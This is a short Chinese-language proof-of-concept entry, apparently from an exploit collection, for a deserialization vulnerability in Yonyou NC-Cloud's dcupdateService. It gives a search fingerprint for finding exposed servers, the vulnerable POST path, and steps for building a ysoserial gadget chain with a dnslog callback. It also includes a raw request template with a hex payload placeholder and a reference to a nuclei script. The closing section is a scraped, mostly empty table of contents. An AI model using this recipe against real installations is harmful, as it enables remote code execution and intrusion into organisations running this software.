# 用友NC-ClouddcupdateService存在反序列化漏洞

- **系统**：用友　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`POST /fs/dcupdateService/files HTTP/1.1`

**请求体 / payload**
```
1. 用yakit生成dnslog域名
2. 使用yso生成利用链
3. 将上一步生成的hex数据替换payload字段，探测是否存在漏洞
Host: {hostname}
Cookie: JSESSIONID=976CCA93B65FC45D67236311CCF581AB; JSESSIONID=84A233F63DC3637A8958D22F7FD8B305
Sec-Fetch-User: ?1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
{{hexd(payload)}}

nuclei脚本\
\[用友-nc-cloud-files-反序列化.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 用友NC-Cloud dcupdateService存在反序列化漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
  * 四、漏洞复现
***
- 版本: * 用友NC-Cloud